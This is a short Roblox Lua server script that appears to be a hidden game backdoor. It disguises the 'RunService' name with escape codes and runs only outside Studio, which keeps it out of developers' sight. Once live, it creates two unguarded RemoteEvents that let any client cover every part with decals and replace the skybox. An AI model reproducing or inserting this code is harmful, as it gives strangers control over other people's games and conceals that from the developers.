if not game:GetService('\82\117\110\83\101\114\118\105\99\101'):IsStudio() then local ReplicatedStorage=game:GetService("ReplicatedStorage") local remoteEvent1=Instance.new("RemoteEvent") remoteEvent1.Name="CulEvent2" remoteEvent1.Parent=ReplicatedStorage local remoteEvent2=Instance.new("RemoteEvent") remoteEvent2.Name="CulEvent" remoteEvent2.Parent=ReplicatedStorage game:GetService('ReplicatedStorage'):WaitForChild('CulEvent2').OnServerEvent:Connect(function() for _,v in ipairs(game:GetService('Workspace'):GetDescendants()) do if v:IsA('BasePart') then for _,face in ipairs(Enum.NormalId:GetEnumItems()) do local decal=Instance.new('Decal') decal.Parent=v decal.Texture='http://www.roblox.com/asset/?id=10560525674' decal.Face=face end end end end) game:GetService('ReplicatedStorage'):WaitForChild('CulEvent').OnServerEvent:Connect(function() local sky=Instance.new('Sky',game:GetService('Lighting')) local skyboxID='http://www.roblox.com/asset/?id=10560525674' for _,face in ipairs({'SkyboxBk','SkyboxDn','SkyboxFt','SkyboxLf','SkyboxRt','SkyboxUp'}) do sky[face]=skyboxID end end) end
